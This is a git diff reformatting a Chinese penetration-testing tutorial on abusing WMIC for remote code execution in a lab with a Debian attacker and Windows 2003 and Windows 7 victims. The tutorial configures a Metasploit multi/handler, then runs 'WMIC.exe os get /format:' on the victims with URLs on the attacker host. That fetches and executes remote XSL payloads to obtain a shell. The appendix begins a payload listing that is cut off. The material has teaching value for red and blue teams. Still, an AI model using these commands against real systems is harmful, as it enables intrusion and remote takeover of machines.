@@ -1,29 +1,32 @@
-# 专注APT攻击与防御
-https://micropoor.blogspot.com/
-
 **注：**请多喝点热水或者凉白开，可预防**肾结石，通风**等。
 
-**Wmic简介：**
+### Wmic简介：
 
 WMIC扩展WMI（Windows Management Instrumentation，Windows管理工具），提供了从命令行接口和批命令脚本执行系统管理的支持。在WMIC出现之前，如果要管理WMI系统，必须使用一些专门的WMI应用，例如SMS，或者使用WMI的脚本编程API，或者使用象CIM Studio之类的工具。如果不熟悉C++之类的编程语言或VBScript之类的脚本语言，或者不掌握WMI名称空间的基本知识，要用WMI管理系统是很困难的。WMIC改变了这种情况。
 
 **说明：**Wmic.exe所在路径已被系统添加PATH环境变量中，因此，Wmic命令可识别，需注意x86，x64位的Wmic调用。
 
-Windows 2003 默认位置：
+Windows 2003 默认位置：  
 
-`C:\WINDOWS\system32\wbem\wmic.exe
-C:\WINDOWS\SysWOW64\wbem\wmic.exe`
+```bash
+C:\WINDOWS\system32\wbem\wmic.exe
+C:\WINDOWS\SysWOW64\wbem\wmic.exe
+```
 
 Windows 7 默认位置：
 
-`C:\Windows\System32\wbem\WMIC.exe
-C:\Windows\SysWOW64\wbem\WMIC.exe`
+```bash
+C:\Windows\System32\wbem\WMIC.exe
+C:\Windows\SysWOW64\wbem\WMIC.exe
+```
 
-**攻击机：** 192.168.1.4 Debian
-**靶机：** 192.168.1.119 Windows 2003
+**攻击机：**   
+192.168.1.4 Debian  
+**靶机：**   
+192.168.1.119 Windows 2003  
 192.168.1.5 Windows 7
 
-**配置攻击机msf：**
+### 配置攻击机msf：
 ```bash
 msf exploit(multi/handler) > show options 
 
@@ -52,26 +55,30 @@ Id Name
 ```
 ![](media/b48a63a7b8dc65c874cfbc5a624c3441.jpg)
 
-**靶机执行：**
+### 靶机执行：
 
-**Windows 7：**
+**Windows 7：**  
 
-`C:\Windows\SysWOW64\wbem\WMIC.exe os get
-/format:"http://192.168.1.4/Micropoor.xsl"`
+```bash
+C:\Windows\SysWOW64\wbem\WMIC.exe os get
+/format:"http://192.168.1.4/Micropoor.xsl"
+```
 
 ![](media/739a77fc254c6ee0022c0d659604b805.jpg)
 
 ![](media/8efda9d1fa52d730918a573936128982.jpg)
 
-**Windows 2003：**
+**Windows 2003：**  
 ![](media/6dc9319ccfc77a880c4884f50123d5c7.jpg)
 
 ![](media/a9c870954f9e489117b0fcb42fef90c0.jpg)
 
-`WMIC.exe os get /format:"http://192.168.1.4/Micropoor_2003.xsl"`
+```bash
+WMIC.exe os get /format:"http://192.168.1.4/Micropoor_2003.xsl"
+```
 ![](media/2815861c10d1da765b0c3b4456425efc.jpg)
 
-## 附录：
+### 附录：
 **Micropoor_Win7.xsl：**
 ```js
 <?xml version='1.0'?>
